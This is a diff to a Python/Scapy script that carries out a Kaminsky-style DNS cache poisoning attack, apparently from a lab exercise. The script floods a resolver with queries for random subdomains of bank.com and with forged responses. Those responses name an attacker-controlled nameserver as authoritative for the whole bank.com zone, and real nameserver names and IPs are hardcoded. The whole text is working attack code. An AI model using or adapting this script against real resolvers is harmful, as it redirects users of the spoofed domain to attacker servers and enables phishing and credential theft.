@@ -11,6 +11,7 @@ victim_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
 
 # Target domain base to be messed with
 victim_host_base = ".bank.com."
+victim_host = "bank.com."
 
 # Malicious DNS server
 attacker_dns_ip = os.environ['ATK_SERVER_IP']
@@ -61,7 +62,7 @@ def forged_ns_response(id, target_domain, known_ns_domain, known_ns_ip):
         qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
         # DNS Resource Record
         an=0,
-        ns=DNSRR(rrname=target_domain, type='NS', rdata=known_ns_domain, ttl=MAX_TTL),
+        ns=DNSRR(rrname=victim_host, type='NS', rdata=known_ns_domain, ttl=MAX_TTL),
         ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=MAX_TTL)
     )
     return response
@@ -81,16 +82,16 @@ class Poison(Thread):
         id = random.randrange(2 ** 16)
 
         while self.running:
-            target_domain = "www{}{}{}".format(counter, self.offset, victim_host_base)
+            random_domain = "www{}{}{}".format(counter, self.offset, victim_host_base)
             counter += 1
 
-            packet_list = [Ether() / a_request(target_domain)]
+            packet_list = [Ether() / a_request(random_domain)]
 
             for i in range(self.response_amount):
                 packet_list.append(
                     forged_ns_response(
                         (id + i) % (2 ** 16),
-                        target_domain,
+                        random_domain,
                         self.known_ns_domain,
                         self.known_ns_ip
                     )
@@ -120,8 +121,8 @@ if __name__ == '__main__':
     known_ns_domain_2 = "ns02.cashparking.com."
     known_ns_ip_2 = "208.109.255.38"
 
-    t1 = Poison(150, known_ns_domain, known_ns_ip, 'a')
-    t2 = Poison(150, known_ns_domain_2, known_ns_ip_2, 'b')
+    t1 = Poison(150, known_ns_domain, known_ns_ip, 'c')
+    t2 = Poison(150, known_ns_domain_2, known_ns_ip_2, 'd')
     try:
         t1.start()
         t2.start()
